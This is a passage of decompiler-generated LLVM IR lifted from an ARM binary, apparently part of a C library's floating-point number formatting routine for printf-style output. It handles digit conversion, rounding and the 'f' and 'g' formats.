  %v1_1a640 = phi i32 [ %v1_1a640.pre, %dec_label_pc_1a62c.dec_label_pc_1a62c_crit_edge ], [ %v1_1a61c, %dec_label_pc_1a5e8 ]
  %v0_1a638 = phi i32 [ %v0_1a654, %dec_label_pc_1a62c.dec_label_pc_1a62c_crit_edge ], [ 0, %dec_label_pc_1a5e8 ]
  %v0_1a644 = phi i32 [ %v2_1a650, %dec_label_pc_1a62c.dec_label_pc_1a62c_crit_edge ], [ %v0_1a62c.pre, %dec_label_pc_1a5e8 ]
  %v3_1a634 = urem i32 %v0_1a644, 10
  %v1_1a638 = add i32 %v0_1a638, 1
  store i32 %v1_1a638, i32* %r7.global-to-local, align 4
  %v1_1a63c = or i32 %v3_1a634, 48
  store i32 %v1_1a63c, i32* %r2.global-to-local, align 4
  %v2_1a640 = sub i32 %v1_1a640, %v1_1a638
  store i32 %v2_1a640, i32* %r3.global-to-local, align 4
  store i32 %v0_1a644, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_1a64c = trunc i32 %v1_1a63c to i8
  %v3_1a64c = inttoptr i32 %v2_1a640 to i8*
  store i8 %v1_1a64c, i8* %v3_1a64c, align 1
  %v0_1a650 = load i32, i32* %r0.global-to-local, align 4
  %v1_1a650 = load i32, i32* %r1.global-to-local, align 4
  %v2_1a650 = udiv i32 %v0_1a650, %v1_1a650
  store i32 %v2_1a650, i32* %r0.global-to-local, align 4
  %v0_1a654 = load i32, i32* %r7.global-to-local, align 4
  %v7_1a654 = icmp eq i32 %v0_1a654, 8
  store i1 %v7_1a654, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_1a650, i32* %r8.global-to-local, align 4
  %v7_1a65c = icmp slt i32 %v0_1a654, 9
  br i1 %v7_1a65c, label %dec_label_pc_1a62c.dec_label_pc_1a62c_crit_edge, label %dec_label_pc_1a660

dec_label_pc_1a62c.dec_label_pc_1a62c_crit_edge:  ; preds = %dec_label_pc_1a62c
  %v1_1a640.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_1a62c

dec_label_pc_1a660:                               ; preds = %dec_label_pc_1a62c
  %v0_1a660 = load i32, i32* %r4.global-to-local, align 4
  %v1_1a660 = add i32 %v0_1a660, 1
  store i32 %v1_1a660, i32* %r4.global-to-local, align 4
  %v7_1a664 = icmp eq i32 %v0_1a660, 0
  store i1 %v7_1a664, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a664, label %dec_label_pc_1a5e8, label %dec_label_pc_1a66c

dec_label_pc_1a66c:                               ; preds = %dec_label_pc_1a660
  %v0_1a66c = load i32, i32* %sb.global-to-local, align 4
  %v7_1a66c = icmp eq i32 %v0_1a66c, 96
  store i1 %v7_1a66c, i1* %cpsr_z.global-to-local, align 1
  %tmp275 = icmp ult i32 %v0_1a66c, 97
  br i1 %tmp275, label %bb213, label %thread-pre-split

bb213:                                            ; preds = %dec_label_pc_1a66c
  %v5_1a67c = add i32 %v0_1a66c, 32
  store i32 %v5_1a67c, i32* %r3.global-to-local, align 4
  %v5_1a680 = urem i32 %v5_1a67c, 256
  store i32 %v5_1a680, i32* %sb.global-to-local, align 4
  br label %bb214

thread-pre-split:                                 ; preds = %dec_label_pc_1a66c
  %v4_1a678.pre129134 = load i32, i32* %r3.global-to-local, align 4
  %phitmp = urem i32 %v4_1a678.pre129134, 256
  br label %bb214

bb214:                                            ; preds = %thread-pre-split, %bb213
  %v4_1a678126130 = phi i32 [ %phitmp, %thread-pre-split ], [ 69, %bb213 ]
  %v0_1a6a0 = phi i32 [ %v0_1a66c, %thread-pre-split ], [ %v5_1a680, %bb213 ]
  %v7_1a684 = icmp eq i32 %v0_1a6a0, 103
  %. = zext i1 %v7_1a684 to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %v0_1a690 = load i32, i32* %fp.global-to-local, align 4
  %v2_1a690 = icmp eq i32 %v0_1a690, 0
  store i1 %v2_1a690, i1* %cpsr_z.global-to-local, align 1
  %tmp217 = icmp slt i32 %v0_1a690, 1
  br i1 %tmp217, label %.thread17, label %bb218

.thread17:                                        ; preds = %bb214
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb220

bb218:                                            ; preds = %bb214
  %v2_1a698 = icmp eq i1 %v7_1a684, false
  store i1 %v2_1a698, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a698, label %bb220, label %bb219

bb219:                                            ; preds = %bb218
  %v2_1a69c = add i32 %v0_1a690, -1
  store i32 %v2_1a69c, i32* %fp.global-to-local, align 4
  br label %bb220

bb220:                                            ; preds = %.thread17, %bb218, %bb219
  %v0_1a6b0 = phi i32 [ %v0_1a690, %.thread17 ], [ %v0_1a690, %bb218 ], [ %v2_1a69c, %bb219 ]
  %v7_1a6a0 = icmp eq i32 %v0_1a6a0, 102
  store i1 %v7_1a6a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a6a0, label %dec_label_pc_1a6ac, label %bb221

bb221:                                            ; preds = %bb220
  store i32 %v0_1a6b0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1a6d4

dec_label_pc_1a6ac:                               ; preds = %bb220
  store i32 %stack_var_-192.4, i32* %r3.global-to-local, align 4
  %v2_1a6b0 = add i32 %v0_1a6b0, %stack_var_-192.4
  store i32 %v2_1a6b0, i32* %ip.global-to-local, align 4
  %v8_1a6b4 = icmp eq i32 %v2_1a6b0, -1
  store i1 %v8_1a6b4, i1* %cpsr_z.global-to-local, align 1
  %v6_1a6b8 = icmp slt i32 %v2_1a6b0, -1
  br i1 %v6_1a6b8, label %dec_label_pc_1a6bc, label %dec_label_pc_1a6d4

dec_label_pc_1a6bc:                               ; preds = %dec_label_pc_1a6ac
  %v2_1a6bc = ptrtoint i32* %stack_var_-83 to i32
  store i32 %v2_1a6bc, i32* %r0.global-to-local, align 4
  store i32 48, i32* %r1.global-to-local, align 4
  store i32 17, i32* @r2, align 4
  %v2_1a6c8 = bitcast i32* %stack_var_-83 to i8*
  %v3_1a6c8 = call i32 @__GI_memset(i8* %v2_1a6c8, i32 48)
  store i32 %v3_1a6c8, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1a6d4

dec_label_pc_1a6d4:                               ; preds = %bb221, %dec_label_pc_1a6ac, %dec_label_pc_1a6bc
  %v1_1a71892 = phi i32 [ %v3_1a6c8, %dec_label_pc_1a6bc ], [ %v2_1a650, %dec_label_pc_1a6ac ], [ %v2_1a650, %bb221 ]
  %v1_1a6fc = phi i32 [ -1, %dec_label_pc_1a6bc ], [ %v2_1a6b0, %dec_label_pc_1a6ac ], [ %v0_1a6b0, %bb221 ]
  %stack_var_-192.5 = phi i32 [ -1, %dec_label_pc_1a6bc ], [ %stack_var_-192.4, %dec_label_pc_1a6ac ], [ %stack_var_-192.4, %bb221 ]
  %v1_1a6d8 = add i32 %v1_1a6fc, -16
  %v3_1a6d8 = sub i32 15, %v1_1a6fc
  %v4_1a6d8 = and i32 %v3_1a6d8, %v1_1a6fc
  %v5_1a6d8 = icmp slt i32 %v4_1a6d8, 0
  %v6_1a6d8 = icmp slt i32 %v1_1a6d8, 0
  %v7_1a6d8 = icmp eq i32 %v1_1a6fc, 16
  store i1 %v7_1a6d8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 48, i32* %stack_var_-82, align 4
  %v2_1a6e4 = ptrtoint i32* %stack_var_-83 to i32
  store i32 %v2_1a6e4, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-83, align 4
  %v3_1a6ec = xor i1 %v6_1a6d8, %v5_1a6d8
  %v4_1a6ec = or i1 %v7_1a6d8, %v3_1a6ec
  br i1 %v4_1a6ec, label %dec_label_pc_1a6f8, label %.thread140

.thread140:                                       ; preds = %dec_label_pc_1a6d4
  %v7_1a6ec137141 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v7_1a6ec137141, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.preheader

dec_label_pc_1a6f8:                               ; preds = %dec_label_pc_1a6d4
  %v2_1a6f8 = ptrtoint i32* %stack_var_-82 to i32
  %v2_1a6fc = add i32 %v1_1a6fc, %v2_1a6f8
  store i32 %v2_1a6fc, i32* %r3.global-to-local, align 4
  %v1_1a700 = add i32 %v2_1a6fc, 2
  %v2_1a700 = inttoptr i32 %v1_1a700 to i8*
  %v3_1a700 = load i8, i8* %v2_1a700, align 1
  %v4_1a700 = zext i8 %v3_1a700 to i32
  store i32 %v4_1a700, i32* %r2.global-to-local, align 4
  store i32 %v1_1a700, i32* %r1.global-to-local, align 4
  %v2_1a708 = icmp ugt i8 %v3_1a700, 51
  %v7_1a708 = icmp eq i8 %v3_1a700, 52
  store i1 %v7_1a708, i1* %cpsr_z.global-to-local, align 1
  %v2_1a70c = xor i1 %v2_1a708, true
  %v3_1a70c = or i1 %v7_1a708, %v2_1a70c
  br i1 %v3_1a70c, label %bb222, label %bb223

bb222:                                            ; preds = %dec_label_pc_1a6f8
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb223

bb223:                                            ; preds = %dec_label_pc_1a6f8, %bb222
  %v1_1a71890 = phi i32 [ %v1_1a71892, %dec_label_pc_1a6f8 ], [ 0, %bb222 ]
  %v2_1a710 = xor i1 %v7_1a708, true
  %v3_1a710 = and i1 %v2_1a708, %v2_1a710
  br i1 %v3_1a710, label %bb224, label %.preheader

bb224:                                            ; preds = %bb223
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %bb223, %bb224, %.thread140, %._crit_edge87
  %v0_1a714 = phi i32 [ %v0_1a714.pre, %._crit_edge87 ], [ %v7_1a6ec137141, %.thread140 ], [ %v1_1a700, %bb223 ], [ %v1_1a700, %bb224 ]
  %v1_1a718 = phi i32 [ %v1_1a718.pre, %._crit_edge87 ], [ 0, %.thread140 ], [ %v1_1a71890, %bb223 ], [ 1, %bb224 ]
  %v1_1a714 = add i32 %v0_1a714, -1
  %v2_1a714 = inttoptr i32 %v1_1a714 to i8*
  %v3_1a714 = load i8, i8* %v2_1a714, align 1
  %v4_1a714 = zext i8 %v3_1a714 to i32
  store i32 %v1_1a714, i32* %r1.global-to-local, align 4
  %v2_1a718 = add i32 %v4_1a714, %v1_1a718
  %v1_1a71c = urem i32 %v2_1a718, 256
  store i32 %v1_1a71c, i32* %r3.global-to-local, align 4
  %v2_1a720 = icmp ugt i32 %v1_1a71c, 56
  %v7_1a720 = icmp eq i32 %v1_1a71c, 57
  store i1 %v7_1a720, i1* %cpsr_z.global-to-local, align 1
  %v2_1a724 = xor i1 %v2_1a720, true
  %v3_1a724 = or i1 %v7_1a720, %v2_1a724
  br i1 %v3_1a724, label %bb225, label %bb226

bb225:                                            ; preds = %.preheader
  store i32 0, i32* %r2.global-to-local, align 4
  br label %bb226

bb226:                                            ; preds = %.preheader, %bb225
  %v2_1a728 = xor i1 %v7_1a720, true
  %v3_1a728 = and i1 %v2_1a720, %v2_1a728
  br i1 %v3_1a728, label %bb227, label %bb226.bb228_crit_edge

bb226.bb228_crit_edge:                            ; preds = %bb226
  %v1_1a730.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb228

bb227:                                            ; preds = %bb226
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb228

bb228:                                            ; preds = %bb226.bb228_crit_edge, %bb227
  %v1_1a730 = phi i32 [ %v1_1a730.pre, %bb226.bb228_crit_edge ], [ 1, %bb227 ]
  %v7_1a72c = icmp eq i32 %v1_1a71c, 48
  store i1 %v7_1a72c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a72c, label %bb229, label %._crit_edge93

bb229:                                            ; preds = %bb228
  %v2_1a730 = or i32 %v1_1a730, 1
  store i32 %v2_1a730, i32* %r2.global-to-local, align 4
  br label %._crit_edge93

._crit_edge93:                                    ; preds = %bb228, %bb229
  %v0_1a734 = phi i32 [ 1, %bb229 ], [ %v1_1a730, %bb228 ]
  %v2_1a734 = icmp eq i32 %v0_1a734, 0
  store i1 %v2_1a734, i1* %cpsr_z.global-to-local, align 1
  %v1_1a738 = trunc i32 %v2_1a718 to i8
  store i8 %v1_1a738, i8* %v2_1a714, align 1
  %v0_1a73c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a73c, label %dec_label_pc_1a740, label %._crit_edge87

._crit_edge87:                                    ; preds = %._crit_edge93
  %v1_1a718.pre = load i32, i32* %r0.global-to-local, align 4
  %v0_1a714.pre = load i32, i32* %r1.global-to-local, align 4
  br label %.preheader

dec_label_pc_1a740:                               ; preds = %._crit_edge93
  store i32 %v2_1a6e4, i32* %r2.global-to-local, align 4
  %v2_1a744 = ptrtoint i32* %stack_var_-82 to i32
  store i32 %v2_1a744, i32* %r3.global-to-local, align 4
  %v0_1a748 = load i32, i32* %r1.global-to-local, align 4
  %v3_1a748 = icmp uge i32 %v0_1a748, %v2_1a744
  %v9_1a748 = icmp eq i32 %v0_1a748, %v2_1a744
  store i1 %v9_1a748, i1* %cpsr_z.global-to-local, align 1
  %v2_1a74c = xor i1 %v3_1a748, true
  %v3_1a74c = or i1 %v9_1a748, %v2_1a74c
  br i1 %v3_1a74c, label %bb230, label %.thread145

bb230:                                            ; preds = %dec_label_pc_1a740
  store i32 %stack_var_-192.5, i32* @lr, align 4
  store i32 %v2_1a744, i32* %r2.global-to-local, align 4
  store i32 %v2_1a744, i32* %r1.global-to-local, align 4
  br label %.thread145

.thread145:                                       ; preds = %dec_label_pc_1a740, %bb230
  %v2_1a76c = phi i32 [ %v2_1a744, %bb230 ], [ %v0_1a748, %dec_label_pc_1a740 ]
  %v4_1a760144 = phi i32 [ %v2_1a744, %bb230 ], [ %v2_1a6e4, %dec_label_pc_1a740 ]
  %v2_1a758 = xor i1 %v9_1a748, true
  %v3_1a758 = and i1 %v3_1a748, %v2_1a758
  br i1 %v3_1a758, label %bb231, label %bb232

bb231:                                            ; preds = %.thread145
  store i32 %stack_var_-192.5, i32* %r0.global-to-local, align 4
  br label %bb232

bb232:                                            ; preds = %.thread145, %bb231
  br i1 %v3_1a74c, label %bb233, label %bb234

bb233:                                            ; preds = %bb232
  %v4_1a75c = load i32, i32* @lr, align 4
  %v5_1a75c = add i32 %v4_1a75c, 1
  store i32 %v5_1a75c, i32* %r0.global-to-local, align 4
  br label %bb234

bb234:                                            ; preds = %bb232, %bb233
  br i1 %v3_1a758, label %bb235, label %bb236

bb235:                                            ; preds = %bb234
  %v5_1a760 = add i32 %v4_1a760144, 2
  store i32 %v5_1a760, i32* %r2.global-to-local, align 4
  br label %bb236

bb236:                                            ; preds = %bb234, %bb235
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1a768 = load i32, i32* %sb.global-to-local, align 4
  %v7_1a768 = icmp eq i32 %v0_1a768, 103
  store i1 %v7_1a768, i1* %cpsr_z.global-to-local, align 1
  %v3_1a76c = add i32 %v2_1a76c, 1
  %v4_1a76c = inttoptr i32 %v3_1a76c to i8*
  store i8 0, i8* %v4_1a76c, align 1
  %v0_1a770 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a770 = add i32 %v0_1a770, 1
  store i32 %v1_1a770, i32* %lr.global-to-local, align 4
  %v0_1a774 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a774, label %dec_label_pc_1a778, label %dec_label_pc_1a7a0

dec_label_pc_1a778:                               ; preds = %bb236
  %v0_1a778 = load i32, i32* %r0.global-to-local, align 4
  %v1_1a778 = load i32, i32* %ip.global-to-local, align 4
  %v2_1a778 = sub i32 %v0_1a778, %v1_1a778
  %v4_1a778 = xor i32 %v1_1a778, %v0_1a778
  %v5_1a778 = xor i32 %v2_1a778, %v0_1a778
  %v6_1a778 = and i32 %v5_1a778, %v4_1a778
  %v7_1a778 = icmp slt i32 %v6_1a778, 0
  %v8_1a778 = icmp slt i32 %v2_1a778, 0
  %v9_1a778 = icmp eq i32 %v0_1a778, %v1_1a778
  %v3_1a77c = xor i1 %v8_1a778, %v7_1a778
  %v4_1a77c = or i1 %v9_1a778, %v3_1a77c
  %.258 = zext i1 %v4_1a77c to i32
  store i32 %.258, i32* %r3.global-to-local, align 4
  %v1_1a784 = add i32 %v0_1a778, 4
  %v3_1a784 = sub i32 0, %v0_1a778
  %v4_1a784 = and i32 %v1_1a784, %v3_1a784
  %v5_1a784 = icmp slt i32 %v4_1a784, 0
  %v6_1a784 = icmp slt i32 %v1_1a784, 0
  %v7_1a784 = icmp eq i32 %v1_1a784, 0
  store i1 %v7_1a784, i1* %cpsr_z.global-to-local, align 1
  %v2_1a788 = xor i1 %v6_1a784, %v5_1a784
  br i1 %v2_1a788, label %.thread22, label %bb239

.thread22:                                        ; preds = %dec_label_pc_1a778
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1aabc

bb239:                                            ; preds = %dec_label_pc_1a778
  %v2_1a78c = icmp eq i1 %v4_1a77c, false
  store i1 %v2_1a78c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a78c, label %dec_label_pc_1aabc, label %.thread25

.thread25:                                        ; preds = %bb239
  %v3_1a790 = sub i32 %v1_1a778, %v0_1a778
  store i32 %v3_1a790, i32* %fp.global-to-local, align 4
  store i32 102, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1a7ac

dec_label_pc_1a7a0:                               ; preds = %bb236
  %v0_1a7a0 = load i32, i32* %sb.global-to-local, align 4
  %v7_1a7a0 = icmp eq i32 %v0_1a7a0, 102
  store i1 %v7_1a7a0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_1a7a0, i32* %r8.global-to-local, align 4
  br i1 %v7_1a7a0, label %dec_label_pc_1a7a0.dec_label_pc_1a7ac_crit_edge, label %dec_label_pc_1a7bc

dec_label_pc_1a7a0.dec_label_pc_1a7ac_crit_edge:  ; preds = %dec_label_pc_1a7a0
  %v0_1a7ac.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a7ac

dec_label_pc_1a7ac:                               ; preds = %.thread25, %dec_label_pc_1a7a0.dec_label_pc_1a7ac_crit_edge
  %v0_1a7ac = phi i32 [ %v0_1a7ac.pre, %dec_label_pc_1a7a0.dec_label_pc_1a7ac_crit_edge ], [ %v0_1a778, %.thread25 ]
  %v1_1a7ac = icmp slt i32 %v0_1a7ac, 0
  %v2_1a7ac = icmp eq i32 %v0_1a7ac, 0
  store i1 %v2_1a7ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_1a7ac, label %bb240, label %dec_label_pc_1a7bc

bb240:                                            ; preds = %dec_label_pc_1a7ac
  store i32 48, i32* %r3.global-to-local, align 4
  %v5_1a7b4 = load i32, i32* %r2.global-to-local, align 4
  %v6_1a7b4 = add i32 %v5_1a7b4, -1
  %v7_1a7b4 = inttoptr i32 %v6_1a7b4 to i8*
  store i8 48, i8* %v7_1a7b4, align 1
  %v8_1a7b4 = load i32, i32* %r2.global-to-local, align 4
  %v9_1a7b4 = add i32 %v8_1a7b4, -1
  store i32 %v9_1a7b4, i32* %r2.global-to-local, align 4
  %v0_1a7b8.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_1a7ec.pre.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_1a7bc

dec_label_pc_1a7bc:                               ; preds = %bb240, %dec_label_pc_1a7ac, %dec_label_pc_1aabc, %dec_label_pc_1a7a0
  %v1_1a7ec = phi i32 [ %v1_1a770, %dec_label_pc_1a7a0 ], [ %v1_1a770, %dec_label_pc_1aabc ], [ %v1_1a7ec.pre.pre, %bb240 ], [ %v1_1a770, %dec_label_pc_1a7ac ]
  %v1_1a86431 = phi i32 [ 0, %dec_label_pc_1a7a0 ], [ 0, %dec_label_pc_1aabc ], [ %v0_1a7b8.pre, %bb240 ], [ %v0_1a7ac, %dec_label_pc_1a7ac ]
  store i32 %v1_1a86431, i32* %r1.global-to-local, align 4
  store i32 1, i32* %stack_var_-164, align 4
  store i32 176, i32* %r4.global-to-local, align 4
  %v2_1a7c8 = ptrtoint i32* %stack_var_-42 to i32
  store i32 %v2_1a7c8, i32* %r3.global-to-local, align 4
  %v0_1a7d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a7d4 = inttoptr i32 %v0_1a7d4 to i8*
  %v2_1a7d4 = load i8, i8* %v1_1a7d4, align 1
  %v3_1a7d4 = zext i8 %v2_1a7d4 to i32
  store i32 %v3_1a7d4, i32* %r3.global-to-local, align 4
  %v5_1a7d4 = add i32 %v0_1a7d4, 1
  store i32 %v5_1a7d4, i32* %r2.global-to-local, align 4
  %v1_1a7d8 = icmp slt i32 %v1_1a86431, 0
  %v2_1a7d8 = icmp eq i32 %v1_1a86431, 0
  store i1 %v2_1a7d8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r5.global-to-local, align 4
  store i32 %v5_1a7d4, i32* %r6.global-to-local, align 4
  store i32 %v3_1a7d4, i32* %stack_var_-42, align 4
  %v2_1a7ec = sub i32 %v1_1a7ec, %v5_1a7d4
  store i32 %v2_1a7ec, i32* %ip.global-to-local, align 4
  br i1 %v1_1a7d8, label %.thread, label %dec_label_pc_1a7f8

.thread:                                          ; preds = %dec_label_pc_1a7bc
  %v5_1a7f0 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v5_1a7f0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1a874

dec_label_pc_1a7f8:                               ; preds = %dec_label_pc_1a7bc
  store i32 112, i32* %r3.global-to-local, align 4
  %v2_1a7fc = sub i32 %v1_1a86431, %v2_1a7ec
  %v4_1a7fc = xor i32 %v2_1a7ec, %v1_1a86431
  %v5_1a7fc = xor i32 %v2_1a7fc, %v1_1a86431
  %v6_1a7fc = and i32 %v5_1a7fc, %v4_1a7fc
  %v7_1a7fc = icmp slt i32 %v6_1a7fc, 0
  %v8_1a7fc = icmp slt i32 %v2_1a7fc, 0
  %v9_1a7fc = icmp eq i32 %v1_1a86431, %v2_1a7ec
  store i1 %v9_1a7fc, i1* %cpsr_z.global-to-local, align 1
  store i32 112, i32* %stack_var_-156, align 4
  %v2_1a808 = xor i1 %v8_1a7fc, %v7_1a7fc
  br i1 %v2_1a808, label %dec_label_pc_1a854, label %dec_label_pc_1a80c

dec_label_pc_1a80c:                               ; preds = %dec_label_pc_1a7f8
  store i32 %v2_1a7fc, i32* %r2.global-to-local, align 4
  %v2_1a810 = icmp eq i32 %v2_1a7fc, 0
  store i1 %v2_1a810, i1* %cpsr_z.global-to-local, align 1
  %v2_1a814 = ptrtoint i32* %stack_var_-180 to i32
  store i32 %v2_1a814, i32* %lr.global-to-local, align 4
  %tmp241 = icmp slt i32 %v2_1a7fc, 1
  br i1 %tmp241, label %.thread148, label %dec_label_pc_1a828

.thread148:                                       ; preds = %dec_label_pc_1a80c
  %v7_1a81c = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v7_1a81c, i32* %r7.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %.thread35

dec_label_pc_1a828:                               ; preds = %dec_label_pc_1a80c
  store i32 add (i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32 -33069), i32* %r3.global-to-local, align 4
  %v2_1a838 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_1a838, i32* %r7.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 -1, i32* %r1.global-to-local, align 4
  store i32 176, i32* %stack_var_-144, align 4
  br label %dec_label_pc_1a874

dec_label_pc_1a854:                               ; preds = %dec_label_pc_1a7f8
  store i1 %v2_1a7d8, i1* %cpsr_z.global-to-local, align 1
  %v2_1a858 = ptrtoint i32* %stack_var_-180 to i32
  store i32 %v2_1a858, i32* %lr.global-to-local, align 4
  br i1 %v2_1a7d8, label %bb242, label %bb243

bb242:                                            ; preds = %dec_label_pc_1a854
  %v3_1a860 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v3_1a860, i32* %r7.global-to-local, align 4
  br label %.thread35

bb243:                                            ; preds = %dec_label_pc_1a854
  %v3_1a864 = sub i32 %v2_1a7ec, %v1_1a86431
  store i32 %v3_1a864, i32* %ip.global-to-local, align 4
  %v3_1a86864 = add i32 %v5_1a7d4, %v1_1a86431
  store i32 %v3_1a86864, i32* %r6.global-to-local, align 4
  %v3_1a86c = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v3_1a86c, i32* %r7.global-to-local, align 4
  br label %.thread35

.thread35:                                        ; preds = %.thread148, %bb242, %bb243
  %v1_1a8b4265 = phi i32 [ %v3_1a860, %bb242 ], [ %v3_1a86c, %bb243 ], [ %v7_1a81c, %.thread148 ]
  %v0_1a888102 = phi i32 [ %v2_1a7ec, %bb242 ], [ %v3_1a864, %bb243 ], [ 0, %.thread148 ]
  store i32 -1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1a874

dec_label_pc_1a874:                               ; preds = %.thread, %dec_label_pc_1a828, %.thread35
  %v1_1a8b4 = phi i32 [ %v2_1a838, %dec_label_pc_1a828 ], [ %v1_1a8b4265, %.thread35 ], [ %v5_1a7f0, %.thread ]
  %v0_1a8c8109 = phi i32 [ -1, %dec_label_pc_1a828 ], [ -1, %.thread35 ], [ %v1_1a86431, %.thread ]
  %v0_1a888 = phi i32 [ 0, %dec_label_pc_1a828 ], [ %v0_1a888102, %.thread35 ], [ %v2_1a7ec, %.thread ]
  %v3_1a874 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1a874, i32* %r2.global-to-local, align 4
  %v1_1a878 = add i32 %v3_1a874, 12
  %v2_1a878 = inttoptr i32 %v1_1a878 to i32*
  %v3_1a878 = load i32, i32* %v2_1a878, align 4
  %v1_1a87c = and i32 %v3_1a878, 16
  store i32 %v1_1a87c, i32* %r4.global-to-local, align 4
  %v2_1a87c = icmp eq i32 %v1_1a87c, 0
  %tmp270 = zext i1 %v2_1a87c to i32
  %.259 = xor i32 %tmp270, 1
  store i32 %.259, i32* %r3.global-to-local, align 4
  %v2_1a888 = icmp eq i32 %v0_1a888, 0
  store i1 %v2_1a888, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a888, label %bb246, label %.thread38

.thread38:                                        ; preds = %dec_label_pc_1a874
  store i32 1, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1a8a4

bb246:                                            ; preds = %dec_label_pc_1a874
  store i1 %v2_1a87c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a87c, label %dec_label_pc_1a898, label %dec_label_pc_1a8a4

dec_label_pc_1a898:                               ; preds = %bb246
  %v0_1a898 = load i32, i32* %sb.global-to-local, align 4
  %v7_1a898 = icmp eq i32 %v0_1a898, 103
  store i1 %v7_1a898, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a898, label %dec_label_pc_1a8c8, label %bb247

bb247:                                            ; preds = %dec_label_pc_1a898
  %v1_1a89c = load i32, i32* %fp.global-to-local, align 4
  %v3_1a89c = icmp eq i32 %v1_1a89c, 0
  store i1 %v3_1a89c, i1* %cpsr_z.global-to-local, align 1
  %tmp248 = icmp slt i32 %v1_1a89c, 1
  br i1 %tmp248, label %dec_label_pc_1a8c8, label %dec_label_pc_1a8a4

dec_label_pc_1a8a4:                               ; preds = %.thread38, %bb246, %bb247
  store i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32* %lr.global-to-local, align 4
  store i32 add (i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32 -33072), i32* %r3.global-to-local, align 4
  %v2_1a8b4 = inttoptr i32 %v1_1a8b4 to i32*
  store i32 112, i32* %v2_1a8b4, align 4
  %v0_1a8b8 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a8b8 = add i32 %v0_1a8b8, 16
  store i32 %v1_1a8b8, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_1a8c0 = load i32, i32* %r7.global-to-local, align 4
  %v1_1a8c0 = add i32 %v0_1a8c0, 4
  %v2_1a8c0 = inttoptr i32 %v1_1a8c0 to i32*
  store i32 1, i32* %v2_1a8c0, align 4
  %v4_1a8c0 = add i32 %v0_1a8c0, 8
  %v5_1a8c0 = inttoptr i32 %v4_1a8c0 to i32*
  %v6_1a8c0 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v6_1a8c0, i32* %v5_1a8c0, align 4
  %v0_1a8c4 = load i32, i32* %r7.global-to-local, align 4
  %v1_1a8c4 = add i32 %v0_1a8c4, 12
  store i32 %v1_1a8c4, i32* %r7.global-to-local, align 4
  %v0_1a8c8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1a8c8

dec_label_pc_1a8c8:                               ; preds = %dec_label_pc_1a898, %bb247, %dec_label_pc_1a8a4
  %v1_1a8e8 = phi i32 [ %v1_1a8b4, %bb247 ], [ %v1_1a8c4, %dec_label_pc_1a8a4 ], [ %v1_1a8b4, %dec_label_pc_1a898 ]
  %v0_1a8c8 = phi i32 [ %v0_1a8c8109, %bb247 ], [ %v0_1a8c8.pre, %dec_label_pc_1a8a4 ], [ %v0_1a8c8109, %dec_label_pc_1a898 ]
  %v1_1a8c8 = add i32 %v0_1a8c8, 1
  store i32 %v1_1a8c8, i32* %lr.global-to-local, align 4
  %v6_1a8c8 = icmp slt i32 %v1_1a8c8, 0
  %v7_1a8c8 = icmp eq i32 %v1_1a8c8, 0
  store i1 %v7_1a8c8, i1* %cpsr_z.global-to-local, align 1
